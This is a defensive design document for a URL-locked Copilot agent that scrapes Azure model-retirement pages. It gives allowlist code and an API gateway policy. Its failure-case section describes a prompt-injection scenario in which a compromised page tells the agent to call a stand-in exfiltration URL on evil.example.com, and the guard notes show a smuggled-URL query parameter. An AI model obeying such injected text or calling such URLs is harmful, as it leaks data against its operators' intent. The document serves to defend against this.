# Model-Retirement Scraper on M365 Copilot (custom agent)

A URL-locked, scheduled custom agent that scrapes **only** the Azure/Bedrock
model-retirement pages on `learn.microsoft.com`, parses them, enriches your model report,
and writes the result to SharePoint. The agent is prevented from reaching any other host —
and, at the tool layer, any other page.

> **The core security idea:** an agent instruction saying "only scrape these URLs" is **not**
> a control. A compromised page could try to redirect it. The URL restriction is enforced in
> **two independent layers**, neither of which the model can talk its way past:
>
> - **Layer 2 (tool code):** the one action the agent has runs an **exact-URL allowlist** —
>   the normalized URL must equal one of two frozen page strings (host **and** path).
> - **Layer 1 (egress):** Azure API Management is the only path out; its policy pins the
>   backend to the Learn host and 403s anything else. This is **host-level** (see §2 for why
>   the path lock must live in L2).

---

## 1. Components — what each one is and how it works individually

### Power Automate
**What it is:** Microsoft's managed workflow/automation service.
**How it works on its own:** a flow starts from a trigger (schedule, event, webhook) and runs
a sequence of connector actions. The **Recurrence** trigger is a pure timer — it fires the
flow on a cron-like cadence and carries no business logic itself.
**Here:** a daily **Recurrence** (06:00) invokes the Copilot agent. It also owns the final
**SharePoint connector** action that writes the output file. (In the no-agent variant it runs
the whole fetch→parse→write itself.)

### Copilot Studio agent (declarative custom agent)
**What it is:** a custom agent built in Copilot Studio — the model plus its instructions and
the specific set of **actions** you grant it.
**How it works on its own:** the agent can only invoke actions you explicitly add. A
declarative agent has **no inherent web access**; "general knowledge / web search" is a
capability you toggle **on or off** in its settings. With it off and exactly one action
added, the agent's entire action surface is that one action.
**Here:** web search / general knowledge is **OFF**; exactly **one** action is registered —
the custom connector below. The agent has no verb for "browse the web" or "fetch arbitrary
URL." Its instructions name the two legitimate URLs, but — as always — that naming is
**guidance, not enforcement**.

### Custom connector action (Enforcement Layer 2)
**What it is:** the one action the agent can call, defined by an OpenAPI spec and backed by
the APIM endpoint.
**How it works on its own:** the connector exposes a named operation with a typed schema; the
agent calls it with arguments, the connector relays to its backend, returns the response.
Any logic you place in the connector's request transform (or a thin Azure Function it fronts)
runs on **every** call, regardless of what the model intended.
**Here:** before relaying, the action runs the **exact-URL allowlist** — the `url` argument
is normalized and must be one of the two frozen page strings, else it rejects. This is the
*only* layer that enforces "right page", because APIM (L1) sees host, not the full intended
path (see §2). Code in §2.1.

### Entra ID app registration
**What it is:** the identity of the agent as a security principal in Entra ID.
**How it works on its own:** an app registration holds a client ID + secret/certificate and
the API permissions the principal is granted. It is *who* is calling, enabling token-based
auth and conditional-access evaluation.
**Here:** the agent authenticates to APIM with client credentials from this registration, so
every call is an identifiable, policy-gated principal — not anonymous traffic.

### Azure API Management (Enforcement Layer 1)
**What it is:** Azure's managed API gateway.
**How it works on its own:** all calls hit APIM first; inbound/backend **policies** (XML)
run on each request — they can rewrite the backend, validate headers, check the caller, and
reject with 403. It is the single egress chokepoint you put in front of a backend.
**Here:** the backend is pinned via `set-backend-service` to `https://learn.microsoft.com`.
Any attempt to route to a different backend host is rejected with 403 and logged. This is a
**host-level** allowlist — APIM governs which host the call reaches, not which exact page the
agent *intended* (that's L2's job).

### Entra Conditional Access (named location)
**What it is:** Entra ID's policy engine for gating sign-ins by conditions.
**How it works on its own:** a **named location** defines a trusted set of egress IPs; a CA
policy can require that the principal only authenticate from that location.
**Here:** the agent identity may only call APIM from your controlled network egress, so a
leaked credential used from elsewhere is blocked at sign-in.

### SharePoint / OneDrive
**What it is:** M365 document storage.
**How it works on its own:** versioned file storage with M365 permissions; writable via the
Power Automate SharePoint connector.
**Here:** holds the input `aggregated_report.csv` and the output
`enriched_aggregated_report.csv`, written at the end of the flow.

### Application Insights
**What it is:** Azure's app telemetry/monitoring service.
**How it works on its own:** collects request traces, failures, and custom events; you query
and alarm on them.
**Here:** records run telemetry **and** APIM 403 deny events — your auditable proof that only
`learn.microsoft.com` was ever reached.

---

## 2. The two enforcement layers (why the lock actually holds)

| | Layer 2 — tool code | Layer 1 — egress |
|---|---|---|
| **Where** | Custom connector action (or the Function it fronts) | Azure API Management |
| **Mechanism** | **exact-URL allowlist** (2 normalized strings) | backend-host policy (`set-backend-service` + reject) |
| **Granularity** | the two **exact pages** (host + path) | the **host** `learn.microsoft.com` |
| **Stops** | the agent *forming* a bad call | the call *reaching* a non-Learn backend |
| **If it fails** | Layer 1 still 403s a wrong host | (backstop for wrong host; blind to path) |

Same deliberate asymmetry as the AWS design: **L2 is tighter than L1.** APIM governs the
*backend host*; it does not know which exact Learn *page* the agent intended, so at the
gateway it is `learn.microsoft.com` or 403. The exact-page restriction therefore *must* live
in the action code, where the full URL argument is visible. L1 is the backstop for "wrong
host"; L2 is the only thing that enforces "wrong *page* on the right host."

The agent's instruction ("only use these two URLs") is a **third, non-security** layer —
useful for steering the model, worthless as a control. Treat it as UX, not defense.

### 2.1 The exact-URL allowlist (Layer 2 implementation)

Place this in the Azure Function that the custom connector fronts (cleanest), so the check
runs server-side on every call and the agent can never bypass it:

```python
from urllib.parse import urlsplit, urlunsplit

# The ONLY two pages this action may ever fetch. Frozen set of exact,
# already-normalized URLs — host AND path, no query, no fragment.
_ALLOWED_URLS = frozenset({
    "https://learn.microsoft.com/en-us/azure/ai-foundry/openai/concepts/model-retirements",
    "https://learn.microsoft.com/en-us/azure/ai-services/openai/concepts/model-retirements",
})


def _normalize(url: str) -> str:
    """
    Canonicalize so cosmetic variants can't slip past the string match:
      - scheme must be https; host lowercased
      - strip any query string and fragment
      - strip a single trailing slash on the path
    Anything unparse-able raises.
    """
    parts = urlsplit(url.strip())
    if parts.scheme != "https":
        raise ValueError(f"non-https URL rejected: {url!r}")
    host = parts.netloc.lower()
    path = parts.path.rstrip("/")
    return urlunsplit(("https", host, path, "", ""))   # drops query + fragment


def _assert_allowed(url: str) -> str:
    norm = _normalize(url)
    if norm not in _ALLOWED_URLS:
        raise PermissionError(f"URL not in allowlist, refusing to fetch: {url!r}")
    return norm


def fetch_retirement_page(url: str) -> dict:
    safe_url = _assert_allowed(url)      # <-- L2: exact-URL gate, before any outbound call
    import requests
    from model_lifecycle import _azure_scrape
    resp = requests.get(safe_url, headers={"User-Agent": "retirement-scraper/1.0"}, timeout=30)
    resp.raise_for_status()
    return _azure_scrape(resp.text)
```

Why each guard matters:
- **`frozenset` of exact strings** — not a host check, not a prefix/`startswith` check. A
  prefix check would let a crafted sub-path or look-alike through; exact membership cannot.
- **Drop query + fragment** — `...model-retirements?x=https://evil.com` normalizes to the
  bare page, so a second URL can't be smuggled in a parameter and a junk query can't dodge
  the match.
- **Force `https` + lowercase host** — kills `HTTP://`, `LEARN.microsoft.com`, and
  scheme-downgrade variants that would otherwise be distinct strings.
- **`rstrip("/")` the path** — the only cosmetic variance we *accept* (trailing slash).
- Raise on anything unparse-able rather than falling through to a default.

### 2.2 The APIM backend policy (Layer 1)

Pin the backend host and reject anything else. Minimal inbound policy:

```xml
<policies>
  <inbound>
    <base />
    <!-- Only ever route to the Learn host. Any other backend is refused. -->
    <set-backend-service base-url="https://learn.microsoft.com" />
    <choose>
      <when condition="@(!context.Request.Url.Host.Equals("learn.microsoft.com", System.StringComparison.OrdinalIgnoreCase))">
        <return-response>
          <set-status code="403" reason="Backend host not allowed" />
        </return-response>
      </when>
    </choose>
    <!-- Require the agent's Entra identity (client-credentials token). -->
    <validate-jwt header-name="Authorization" failed-validation-httpcode="401">
      <openid-config url="https://login.microsoftonline.com/{tenant-id}/v2.0/.well-known/openid-configuration" />
      <audiences><audience>{apim-app-id-uri}</audience></audiences>
    </validate-jwt>
  </inbound>
</policies>
```

APIM enforces **host**; it cannot enforce the exact page the agent intended, which is why
§2.1 exists.

---

## 3. End-to-end example — one scheduled run, traced

**Scenario:** the daily Recurrence at **06:00 on 2026-11-06**.

1. **Power Automate Recurrence** fires and invokes the **Copilot agent**.
2. **Agent** (model) reads its instructions and calls its one action:
   `fetch_retirement_page(url="https://learn.microsoft.com/en-us/azure/ai-foundry/openai/concepts/model-retirements")`.
3. **Custom connector** receives the call; its backing **Azure Function** runs
   `_assert_allowed(url)` → normalizes → finds it in `_ALLOWED_URLS` → **passes (L2)**.
4. The Function issues the request **through APIM**. APIM checks the backend host =
   `learn.microsoft.com` → matches → **permit (L1)**. The page returns.
5. The Function runs `_azure_scrape(html)` → e.g.
   `{"gpt-4o": {"deprecation": "", "eol": "2026-03-01"}, "o3-mini": {...}, ...}`.
6. It reads `aggregated_report.csv` from **SharePoint**, runs
   `enrich(df, "azure", model_id_col="model_id")`, and the flow writes
   `enriched_aggregated_report.csv` back to **SharePoint** (new version).
7. **Application Insights** records: `rows_matched=18/26, wrote .../enriched_aggregated_report.csv`.
8. The agent sees no further action needed → flow ends.

### The lock, proven by the failure cases

**Case A — wrong host (exfiltration attempt).** A compromised retirement page hides text
telling the agent to also fetch `https://evil.example.com/exfil?data=...`. The model emits
`fetch_retirement_page(url="https://evil.example.com/...")`.

- **Step 3 (L2)** fails: `_assert_allowed` finds it absent from `_ALLOWED_URLS` →
  `PermissionError`. Blocked.
- **Even if** the action code were bypassed, **step 4 (L1)** fails: APIM sees backend host
  `evil.example.com` → **403** and logs the deny. Blocked.

**Case B — right host, wrong page (what the tightening buys you).** Subtler injection:
`fetch_retirement_page(url="https://learn.microsoft.com/en-us/azure/.../internal-preview-notes")`
— a *different* path on the allowed host.

- **Step 3 (L2)** fails: the normalized URL isn't one of the two frozen strings →
  `PermissionError`. Blocked.
- **Step 4 (L1) would NOT catch this** — the backend host is `learn.microsoft.com`, which
  APIM permits. The gateway is blind to the intended path. **Only the exact-URL check in the
  action code stops Case B.** This is why L2 is tighter than L1.

The agent cannot reach any host but one, and cannot reach any page but two. The instructions
were never trusted to enforce either.

---

## 4. Honest trade-offs

**4.1 Do you even need the agent?** For scraping **two fixed URLs**, the model earns nothing.
The task is deterministic: `GET` two known pages → parse → enrich → write. Wrapping a model
around it adds cost, latency, and a **prompt-injection surface** (steps 2–3 are exactly where
injection enters).

**No-agent variant (recommended unless "must be a Copilot agent" is a hard mandate):**

```
Power Automate Recurrence → Azure Function (Python bs4, same §2.1 check) behind APIM → SharePoint
```

Same two-layer URL lock, **minus** the Copilot agent and custom connector, minus steps 2–3's
injection vector. Cheaper, simpler, strictly safer. Use the full Copilot design only if you
will later add genuine reasoning that justifies a model in the loop.

**4.2 Case B has one enforcement layer, not two.** As in the AWS design, the exact-page
guarantee rests entirely on the §2.1 `frozenset` check, because APIM (like a network firewall)
governs host, not the agent's intended path. If "right host, wrong page" is a threat you're
actually modeling, the only way to get a *second* path-level layer is to have APIM match on
the **full request path** as well (an `<choose>` on `context.Request.Url.Path`), not just the
host. For public MS docs that's likely overkill — but know that, as drawn, Case B is protected
at one layer.

> **Platform note:** Copilot Studio capabilities, connector authoring, and the exact toggle
> names for disabling web/general-knowledge shift fairly often. Verify the current
> "disable general knowledge / web search" control and connector-publishing steps against
> live Microsoft Learn docs before building — don't trust a remembered menu path.
